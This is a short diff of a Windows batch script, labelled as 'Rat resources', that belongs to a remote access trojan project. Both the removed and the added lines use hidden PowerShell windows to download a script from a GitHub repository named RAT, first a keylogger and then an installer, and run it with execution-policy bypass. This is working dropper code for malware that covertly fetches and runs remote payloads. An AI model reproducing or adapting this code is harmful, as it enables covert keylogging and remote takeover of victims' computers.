@@ -30,5 +30,5 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM Rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/resources/keylogger.ps1 -OutFile install.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"
+powershell Start-Process -windowstyle hidden -ep bypass "Installer.ps1"
